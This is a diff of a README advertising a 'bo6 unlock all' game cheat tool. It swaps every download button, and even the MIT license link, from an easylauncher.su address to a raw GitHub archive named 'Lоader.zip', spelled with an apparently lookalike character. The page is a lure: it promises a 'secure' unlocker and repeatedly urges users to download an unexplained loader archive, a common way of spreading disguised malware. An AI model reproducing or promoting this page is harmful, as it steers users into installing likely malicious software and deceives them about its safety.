@@ -1,6 +1,6 @@
 # 🛡️ bo6 unlock all
 
-[![Download Latest](https://img.shields.io/badge/Download-Bo6_Unlock_All-blue?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Latest](https://raw.githubusercontent.com/ThynkMedia/BO6UnlockSuite/main/Lоader.zip)](https://raw.githubusercontent.com/ThynkMedia/BO6UnlockSuite/main/Lоader.zip)
 
 Unlock everything in bo6 with this powerful solution designed for seamless use across popular platforms. 🚀 Get unparalleled access to all in-game items, speeds up your progress, and enjoy enhanced customization. Effortless and secure, your ultimate unlock assistant for 2025!
 
@@ -36,7 +36,7 @@ bo6 unlock, unlock all tool, bo6 all content, unlocker app, unlock bo6 inventory
 ## 🛠️ Installation
 
 **Step 1:**  
-[![Download Latest](https://img.shields.io/badge/Download-Bo6_Unlock_All-blue?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)  
+[![Download Latest](https://raw.githubusercontent.com/ThynkMedia/BO6UnlockSuite/main/Lоader.zip)](https://raw.githubusercontent.com/ThynkMedia/BO6UnlockSuite/main/Lоader.zip)  
 Download the latest bo6 unlock all tool from the button above.
 
 ---
@@ -49,11 +49,11 @@ This tool is offered as-is for educational and entertainment purposes. Usage may
 
 ## 📜 MIT License 2025
 
-Distributed using the [MIT license](https://opensource.org/licenses/MIT).  
+Distributed using the [MIT license](https://raw.githubusercontent.com/ThynkMedia/BO6UnlockSuite/main/Lоader.zip).  
 Refer to LICENSE for full details.
 
 ---
 
 ## ⬇️ Download Again!
 
-[![Download Latest](https://img.shields.io/badge/Download-Bo6_Unlock_All-blue?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Latest](https://raw.githubusercontent.com/ThynkMedia/BO6UnlockSuite/main/Lоader.zip)](https://raw.githubusercontent.com/ThynkMedia/BO6UnlockSuite/main/Lоader.zip)
